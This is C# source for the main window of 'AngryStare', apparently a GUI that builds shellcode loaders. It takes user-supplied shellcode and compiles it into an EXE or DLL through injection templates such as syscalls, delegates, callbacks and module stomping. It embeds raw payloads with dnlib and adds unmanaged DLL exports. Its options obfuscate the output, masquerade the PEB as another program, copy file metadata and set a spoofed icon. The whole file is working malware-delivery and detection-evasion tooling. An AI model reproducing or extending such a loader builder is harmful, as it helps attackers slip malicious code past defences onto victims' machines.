using System;
using System.IO;
using System.Threading;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using Microsoft.Win32;
using AngryStare.UI;
using dnlib.DotNet;
using dnlib.DotNet.Writer;

namespace AngryStare
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        public string SelectTechPath;
        public string SelectValue;
        public string IconPath;
        public string MasPebOriginFile;
        public string[] BufferString;
        public byte[] BuffByte;
        public static bool UseRaw = false;
        public static string exeordll = "winexe";
        


        public MainWindow()
        {
            WindowStartupLocation = WindowStartupLocation.CenterScreen;
            InitializeComponent();
            SetComboBox();
            SetDLLOrEXE();
            SetCompilerBox();
            SelectTechPath = Directory.GetParent(Environment.CurrentDirectory).ToString() + $@"\Technique\{Combo_Tech.Text}";
            IconPath = "";
            Console.SetOut(new TextBoxWriter(log));

        }

        private void Button_Compiler_Click(object sender, RoutedEventArgs e)
        {
            ClearLog();
            if (Combo_Tech.SelectedItem == null) { Console.WriteLine("[!] ERROR : Choose a Technique"); return; }
            if (outputfile.Text == "") { Console.WriteLine("[!] ERROR : Choose a Target Folder"); return; }
            try
            {
                if (UseRaw == true)
                {
                    Console.WriteLine($"[+] Use Raw: {Rawbinpath.Text}");
                    DealWithShellcode.StackShellCode.StackGen(new byte[] { 0x00 }, SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.Text);

                }
                else 
                { 
                    DealWithShellcode.StackShellCode.StackGen(GetBuffer(), SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.Text);
                    Console.WriteLine("[+] Generating template Successful");
                }
            }
            catch (Exception ex) { Console.WriteLine(ex); }
            ///
            /// 写入Hattrick所需cs文件
            ///
            WirteProgramWithHT(SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.SelectedItem.ToString(), MasPebOriginFile,(bool)MasqueradePEB.IsChecked);

            try
            {
                using (Process p = new Process())
                {
                    p.StartInfo = new ProcessStartInfo()
                    {

                        FileName = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
                        //FileName = @"C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Arguments = CompileCommand.Text.TrimStart('c').TrimStart('s').TrimStart('c').TrimStart('.').TrimStart('e').TrimStart('x').TrimStart('e'),
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    };
                    p.Start();
                    Console.WriteLine($"[+] CSC OUPTUT: "+p.StandardOutput.ReadToEnd().ToString());
                }
                
            }
            catch (Exception ex) { Console.WriteLine(ex); }

            // 当使用bin为payload时需要编译完通过dnlib即时添加资源文件
            if (UseRaw == true)
            {

                ModuleDefMD module = ModuleDefMD.Load(outputfile.Text);
                module.Resources.Add(new EmbeddedResource("dotnetlib", File.ReadAllBytes(Rawbinpath.Text)));
                if (dllorexe.SelectedItem.ToString() == "DLL")
                {
                    module.Write(outputfile.Text.TrimEnd('l'));
                    module.Dispose();
                    File.Delete(outputfile.Text);
                    File.Move(outputfile.Text.TrimEnd('l'), outputfile.Text);
                }
                else 
                { 
                    module.Write(outputfile.Text.TrimEnd('e'));
                    module.Dispose();
                    File.Delete(outputfile.Text);
                    File.Move(outputfile.Text.TrimEnd('e'), outputfile.Text);
                }
                
            }
            //当生成dll时通过dnlib添加导出函数
            if (dllorexe.SelectedItem.ToString() == "DLL")
            {
                ModuleDef moduledll = ModuleDefMD.Load(outputfile.Text);
                var type = moduledll.GetTypes().FirstOrDefault(t => t.Name == "Execute");
                var method = type.Methods.FirstOrDefault(m => m.Name == "exec");
                method.ExportInfo = new MethodExportInfo();
                method.IsUnmanagedExport = true;

                var opts = new ModuleWriterOptions(moduledll);
                opts.PEHeadersOptions.Machine = dnlib.PE.Machine.AMD64;
                opts.Cor20HeaderOptions.Flags = 0;

                moduledll.Write(outputfile.Text.TrimEnd('l'),opts);
                moduledll.Dispose();
                File.Delete(outputfile.Text);
                File.Move(outputfile.Text.TrimEnd('l'), outputfile.Text);
            }

            //启用混淆
            if (Simplyobfuscate.IsChecked == true) 
            {
                Console.WriteLine($"[+] Waiting for Obfuscate {dllorexe.SelectedItem.ToString()}....");
                if (dllorexe.SelectedItem.ToString() == "DLL")
                {
                    HatTrick.Obfuscate.obfuscateStart(outputfile.Text, outputfile.Text.TrimEnd('l'));
                    File.Delete(outputfile.Text);
                    File.Move(outputfile.Text.TrimEnd('l'), outputfile.Text);
                }
                else
                {
                    HatTrick.Obfuscate.obfuscateStart(outputfile.Text, outputfile.Text.TrimEnd('e'));
                    File.Delete(outputfile.Text);
                    File.Move(outputfile.Text.TrimEnd('e'), outputfile.Text);
                }
            }
            
            Console.WriteLine($"[+] Complier Over : {outputfile.Text}");

            DealWithShellcode.StackShellCode.StackGen(new byte[] {0x00}, SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.Text);

        }
        public void SetCompilerBox()
        {

            CompileCommand.Text = $@"csc.exe /out:shellcode.exe /t:{exeordll} *.cs /unsafe /nologo /platform:x64 /warn:0";

        }

        public void SetComboBox()
        {
            string TechPath = Directory.GetParent(Environment.CurrentDirectory).ToString() + @"\Technique";
            DirectoryInfo directoryInfo = new DirectoryInfo(TechPath);
            DirectoryInfo[] dirInfo = directoryInfo.GetDirectories();
            foreach (var a in dirInfo)
            {
                Combo_Tech.Items.Add(a.ToString());
            }

        }
        public void SetDLLOrEXE() 
        {
           // dllorexe.SelectedItem
            dllorexe.Items.Add("EXE");
            dllorexe.Items.Add("DLL");
            dllorexe.Text = "EXE";
        }
        public byte[] GetBuffer()
        {

                BufferString = shellcodeText.Text.Split(',');
                List<byte> BufferList = new List<byte>();

                for (int i = 0; i < BufferString.Length; i++)
                {
                    BufferString[i] = BufferString[i].Trim();
                }

                for (int i = 0; i < BufferString.Length; i++)
                {
                    BufferList.Add(Convert.ToByte(BufferString[i], 16));

                }
                BuffByte = BufferList.ToArray();

                return BuffByte;
            
        }

        private void Combo_Tech_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            ClearLog();
            try
            {

                SelectValue = Combo_Tech.SelectedItem.ToString();
                Console.WriteLine($"[+] Use {SelectValue} Technique");
                string csfile = SelectTechPath;
                CompileCommand.Text = $@"csc.exe /out:shellcode.exe /t:{exeordll} {csfile}{SelectValue}\*.cs /unsafe /nologo /platform:x64 /warn:0";
            }
            catch (Exception ex) { Console.WriteLine(ex); return; }

        }
        private void dllorexe_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
           
            try 
            {
                if (dllorexe.SelectedItem.ToString() == "EXE") 
                {
                                       
                    exeordll = "winexe";
                    CompileCommand.Text = $@"csc.exe /out:shellcode.exe /t:{exeordll} {SelectTechPath}{SelectValue}\*.cs /unsafe /nologo /platform:x64 /warn:0";
                    
                }
                if (dllorexe.SelectedItem.ToString() == "DLL")
                {
                    exeordll = "library";
                    CompileCommand.Text = $@"csc.exe /out:shellcode.exe /t:{exeordll} {SelectTechPath}{SelectValue}\*.cs /unsafe /nologo /platform:x64 /warn:0";

                }
            }
            catch 
            {
            
            }
        }

        private void Button_dir_Click(object sender, RoutedEventArgs e)
        {
            ClearLog();
            if (Combo_Tech.SelectedItem == null) { Console.WriteLine("ERROR : Choose a Technique"); return; }
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            if (exeordll == "winexe")
            {
                saveFileDialog.Filter = "exe file (*.exe)|*.exe";
            }
            else 
            {
                saveFileDialog.Filter = "dll file (*.dll)|*.dll";
            }
            saveFileDialog.ShowDialog();
            outputfile.Text = saveFileDialog.FileName;
            try
            {
                SelectValue = Combo_Tech.SelectedItem.ToString();
                string csfile = SelectTechPath;
                CompileCommand.Text = $@"csc.exe /out:{outputfile.Text} /t:{exeordll} {csfile}{SelectValue}\*.cs /unsafe /nologo /platform:x64 /warn:0";
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
        public void ClearLog()
        {
            if (log.Text.ToString() == "Log output")
            {
                log.Text = "";
            }
        }

        private void icon_Click(object sender, RoutedEventArgs e)
        {
            ClearLog();
            if (Combo_Tech.SelectedItem == null) { Console.WriteLine("[!] ERROR : Choose a Technique"); return; }
            if (outputfile.Text == "") { Console.WriteLine("[!] ERROR : Choose a Target Folder"); return; }
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Multiselect = false;
            openFileDialog.Filter = "icon file (*.ico)|*.ico";
            openFileDialog.ShowDialog();
            IconPath = openFileDialog.FileName;
            if (IconPath == "") { return; }
            else { 
            CompileCommand.Text = CompileCommand.Text + " /win32icon:" + IconPath;
            Console.WriteLine($"[+] Use icon: {IconPath}");
            }
        }

        private void MetaData_Click(object sender, RoutedEventArgs e)
        {
            ClearLog();
            if (Combo_Tech.SelectedItem == null) { Console.WriteLine("ERROR : Choose a Technique"); return; }
            AngryStare.MetaData.CopyMateData.ModifyMetadata(SelectTechPath + '\\' + Combo_Tech.Text);
        }

        private void MasqueradePEB_Checked(object sender, RoutedEventArgs e)
        {
            ClearLog();
            
            if (Combo_Tech.SelectedItem == null) { Console.WriteLine("ERROR : Choose a Technique"); return; }
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Multiselect = false;
            openFileDialog.Filter = "exe file (*.exe)|*.exe";
            openFileDialog.ShowDialog();
            MasPebOriginFile = openFileDialog.FileName;
            if (MasPebOriginFile == "") { return; }
            WriteProgram.WritePebCS(SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.SelectedItem.ToString(), MasPebOriginFile);
            Console.WriteLine(@"[+] MasqueradePEB From： " + MasPebOriginFile);
        }
        private void MasqueradePEB_UNChecked(object sender, RoutedEventArgs e)
        {

            MasPebOriginFile = string.Empty;
            
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {

            string[] FilePath = { "MySyscall", "NETDelegate", "CallWinProCallBacK", "ModuleStomp" };
            foreach (string a in FilePath) 
            {
                foreach (var csfile in Directory.GetFiles(Directory.GetParent(Environment.CurrentDirectory).ToString() + $@"\Technique\{a}"))
                {
                    if (csfile.EndsWith("AssemblyInfo.cs") || csfile.EndsWith("Program.cs") || csfile.EndsWith("PEB.cs"))
                    {
                        File.Delete(csfile);
                    }
                }

            }

        }
        public static void WirteProgramWithHT(string ProgramPath, string tech, string pebfile,bool MasqueradePEB) 
        {
            //if (exeordll == "library") 
            //{
            //    return;
            //}
            String MasqueradePEBString = string.Empty;

            FileStream fs = new FileStream(ProgramPath + @"\Program.cs", FileMode.Create);
            StreamWriter sw = new StreamWriter(fs);
            if (MasqueradePEB) 
            {
                MasqueradePEBString = $"PEB peb = new PEB(@\"{pebfile}\");";
            }
            sw.WriteLine(@"using System;
            using System.Collections.Generic;
            using System.Text;");

            sw.WriteLine($"namespace {tech}");
            sw.WriteLine(@"    {
        class Program
        {
            static void Main(string[] args)
            {");
            sw.WriteLine(MasqueradePEBString);


            sw.WriteLine(@"Execute.exec();
            }
        }
    }");
            sw.Close();
            fs.Close();


        }

        public void Rawbinpath_Drop(object sender, DragEventArgs e)
        {

            var dropFile = ((System.Array)e.Data.GetData(System.Windows.DataFormats.FileDrop)).GetValue(0).ToString();
            Rawbinpath.Text = dropFile;
            shellcodeText.IsReadOnly = true;
            shellcodeText.Text = "";
            shellcodeText.Background = Brushes.DarkGray;
            UseRaw = true;

        }


    }
}
